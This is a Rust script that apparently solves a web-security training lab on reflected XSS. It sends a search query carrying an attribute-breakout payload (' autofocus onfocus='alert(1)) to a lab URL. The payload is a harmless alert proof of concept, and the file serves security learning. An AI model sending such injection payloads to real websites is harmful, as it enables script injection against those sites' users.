/**************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 17/11/2023
*
* Lab: Reflected XSS into attribute with angle brackets HTML-encoded
*
* Steps: 1. Inject payload in the search query parameter to call the alert function
*        2. Observe that the script has been executed
*
***************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0ad6002e0307864782aba17400b40081.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // payload to call the alert function
    let payload = r###" " autofocus onfocus="alert(1) "###;

    print!(
        "{}",
        "❯❯ Injecting payload in the search query parameter to call the alert function.. ".white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    client
        .get(format!("{url}?search={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 The lab should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
